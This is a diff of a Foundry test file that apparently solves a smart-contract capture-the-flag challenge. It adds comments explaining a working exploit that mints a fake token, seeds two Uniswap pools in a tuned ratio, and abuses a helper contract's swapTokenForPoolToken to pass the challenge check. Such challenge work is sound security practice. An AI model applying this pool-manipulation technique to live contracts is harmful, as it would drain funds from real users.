@@ -168,18 +168,23 @@ contract ExploitRandom is Test {
     }
 
     function test__exploit() public {
+        // Reserves in dai/weth pool
         (uint256 daiReservesDaiWeth, uint256 wethReservesDaiWeth,) = daiWethLpTkn.getReserves();
 
+        // arbitrary weth/fke liquidity
         uint256 wethToLpInWethFkePool = 20e18;
         uint256 fkeToLpInWethFkePool = 20e18;
 
+        // round number of weth which will be added as liquidity with the weth
+        // already on the mcHelper contract, so total added liquidity on the weth
+        // side will be 11eth
         uint256 wethOutOfWethFkePool = 1e18;
-        // amount on mcHelper
-        uint256 wethToLp = 10e18 + wethOutOfWethFkePool;
 
+        // Mint FKE and WETH
         FKE.mint(address(this), fkeToLpInWethFkePool);
         WETH.deposit{value: wethToLpInWethFkePool}();
 
+        // Add FKE and WETH as liquidity
         router.addLiquidity(
             address(WETH),
             address(FKE),
@@ -191,65 +196,39 @@ contract ExploitRandom is Test {
             block.timestamp
         );
 
-        logUniswapPair(wethFkeLpTkn);
-
         address[] memory path = new address[](2);
         path[0] = address(FKE);
         path[1] = address(WETH);
+        // Calculate the amount of FKE to be swapped to get 1 WETH back
         uint256 fkeIntoWethFkePool = router.getAmountsIn(wethOutOfWethFkePool, path)[0];
-        console2.log("amount FKE in   :: %s", fkeIntoWethFkePool);
-        console2.log("amount WETH Out :: %s", wethOutOfWethFkePool);
-        console2.log();
 
-        uint256 daiOutOfDaiFkePool = (wethToLp * daiReservesDaiWeth) / wethReservesDaiWeth;
+        // Amount of DAI needed to add liquidity in the correct ratio so that
+        // all 11 WETH will be added
+        uint256 daiOutOfDaiFkePool = ((10e18 + wethOutOfWethFkePool) * daiReservesDaiWeth) / wethReservesDaiWeth;
 
+        // Arbitrary amount of DAI to add to pool, must be a multiple of the
+        // daiOutOfDaiFkePool
         uint256 daiToLpInDaiFkePool = daiOutOfDaiFkePool * 10;
+        // Brute forced ratio so that fkeIntoDaiFkePool = fkeIntoWethFkePool
         uint256 fkeToLpInDaiFkePool = daiToLpInDaiFkePool * 100000000000000 / 1799163140847036493;
 
+        // Mint FKE and DAI
         FKE.mint(address(this), fkeToLpInDaiFkePool);
         writeTokenBalance(address(this), address(DAI), daiToLpInDaiFkePool);
 
+        // Add DAI and FKE liquidity
         router.addLiquidity(
-            address(DAI),
-            address(FKE),
-            daiToLpInDaiFkePool,
-            fkeToLpInDaiFkePool,
-            0,
-            0,
-            address(this),
-            block.timestamp
+            address(DAI), address(FKE), daiToLpInDaiFkePool, fkeToLpInDaiFkePool, 0, 0, address(this), block.timestamp
         );
 
-        logUniswapPair(daiFkeLpTkn);
-
+        // Validate fkeIntoDaiFkePool = fkeIntoWethFkePool, becomes our amountIn
         path[1] = address(DAI);
         uint256 fkeIntoDaiFkePool = router.getAmountsIn(daiOutOfDaiFkePool, path)[0];
-        console2.log("amount FKE in  :: %s", fkeIntoDaiFkePool);
-        console2.log("amount DAI Out :: %s", daiOutOfDaiFkePool);
-        console2.log();
-
         assertEq(fkeIntoDaiFkePool, fkeIntoWethFkePool, "amounts should be the same");
 
-        logUniswapPair(daiWethLpTkn);
-        logUniswapPair(daiFkeLpTkn);
-        logUniswapPair(wethFkeLpTkn);
-        console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
-        console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
-
-        uint256 amountIn = fkeToLpInWethFkePool * 2;
+        uint256 amountIn = fkeToLpInWethFkePool * 2; // amountIn * 2
         FKE.mint(address(this), amountIn);
         mcHelper.swapTokenForPoolToken(poolIdDaiWeth, address(FKE), amountIn, 0);
-
-        console2.log("###############################################");
-        console2.log("###############################################");
-        console2.log("###############################################");
-        console2.log();
-
-        logUniswapPair(daiWethLpTkn);
-        logUniswapPair(daiFkeLpTkn);
-        logUniswapPair(wethFkeLpTkn);
-        console2.log("USDC/WETH User balance %s: ", daiWethLpTkn.balanceOf(address(this)));
-        console2.log("WETH mcHelper balance %s: ", WETH.balanceOf(address(mcHelper)));
 
         assertTrue(s.isSolved());
     }
